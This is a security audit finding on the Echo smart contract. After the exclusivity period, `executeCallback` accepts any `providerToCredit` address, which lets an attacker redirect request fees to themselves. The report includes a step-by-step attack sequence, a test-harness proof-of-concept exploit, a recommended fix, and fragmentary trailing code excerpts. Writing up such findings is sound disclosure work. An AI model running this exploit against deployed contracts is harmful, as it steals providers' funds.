### Title
Unvalidated `providerToCredit` Address in `executeCallback` Allows Fee Theft — (File: `target_chains/ethereum/contracts/contracts/echo/Echo.sol`)

### Summary

The `executeCallback` function in the Echo contract accepts a caller-supplied `providerToCredit` address that is credited with the request fee. After the exclusivity period expires, this address is not validated to be the registered provider for the request, allowing any attacker to redirect provider fees to an address they control.

### Finding Description

`Echo.executeCallback` takes a `providerToCredit` parameter and, after verifying price data via Pyth, credits that address's `accruedFeesInWei` balance with the full provider fee: [1](#0-0) 

During the exclusivity window, the contract enforces that `providerToCredit == req.provider`: [2](#0-1) 

However, once `block.timestamp >= req.publishTime + exclusivityPeriodSeconds`, this check is skipped entirely. The fee is then credited to the attacker-supplied address with no further validation: [3](#0-2) 

Provider registration is permissionless — anyone can call `registerProvider`: [4](#0-3) 

A provider can also set themselves as their own fee manager: [5](#0-4) 

`withdrawAsFeeManager` sends funds to `msg.sender` if they are the registered fee manager: [6](#0-5) 

### Impact Explanation

An attacker can steal the full provider fee for any request whose exclusivity period has expired. The legitimate provider fulfills the service (or the attacker fulfills it themselves with valid Pyth update data) but receives no payment. The attacker receives the fee instead. This is a direct theft of funds from the legitimate provider's expected revenue.

### Likelihood Explanation

The attack is fully permissionless and requires no privileged access:
1. Attacker calls `registerProvider(0, 0, 0)` to register their address.
2. Attacker calls `setFeeManager(attackerAddress)` to set themselves as fee manager.
3. Attacker waits for any pending request's exclusivity period to expire (configurable, currently 15 seconds per test setup).
4. Attacker calls `executeCallback(attackerAddress, sequenceNumber, updateData, priceIds)` with valid Pyth update data.
5. Attacker calls `withdrawAsFeeManager(attackerAddress, amount)` to drain the stolen fees.

The exclusivity period is short (15 seconds), making this trivially exploitable on any chain where block times allow it.

### Recommendation

After the exclusivity period, validate that `providerToCredit` is either the registered provider for the request (`req.provider`) or at minimum a registered provider in the system. The simplest fix:

```solidity
require(
    _state.providers[providerToCredit].isRegistered,
    "providerToCredit not registered"
);
```

A stricter fix would restrict `providerToCredit` to `req.provider` at all times, or to a whitelist of registered providers who are permitted to fulfill requests for other providers.

### Proof of Concept

```solidity
// 1. Attacker registers as provider and sets self as fee manager
vm.prank(attacker);
echo.registerProvider(0, 0, 0);
vm.prank(attacker);
echo.setFeeManager(attacker);

// 2. Legitimate user makes a request to the real provider
vm.prank(user);
uint64 seq = echo.requestPriceUpdatesWithCallback{value: fee}(
    legitimateProvider, publishTime, priceIds, gasLimit
);

// 3. Wait for exclusivity period to expire
vm.warp(publishTime + exclusivityPeriod + 1);

// 4. Attacker calls executeCallback crediting themselves
vm.prank(attacker);
echo.executeCallback(attacker, seq, updateData, priceIds);

// 5. Attacker withdraws stolen fees
uint128 stolen = echo.getProviderInfo(attacker).accruedFeesInWei;
vm.prank(attacker);
echo.withdrawAsFeeManager(attacker, stolen);
// attacker.balance increased by stolen fees; legitimateProvider received nothing
```

    function withdrawAsFeeManager(
        address provider,
        uint128 amount
    ) external override {
        require(
            msg.sender == _state.providers[provider].feeManager,
            "Only fee manager"
        );
        require(
            _state.providers[provider].accruedFeesInWei >= amount,
            "Insufficient balance"
        );

        _state.providers[provider].accruedFeesInWei -= amount;

        (bool sent, ) = msg.sender.call{value: amount}("");
        require(sent, "Failed to send fees");

        emit FeesWithdrawn(msg.sender, amount);
    }

    function registerProvider(
        uint96 baseFeeInWei,
        uint96 feePerFeedInWei,
        uint96 feePerGasInWei

        require(!provider.isRegistered, "Provider already registered");
        provider.baseFeeInWei = baseFeeInWei;
        provider.feePerFeedInWei = feePerFeedInWei;
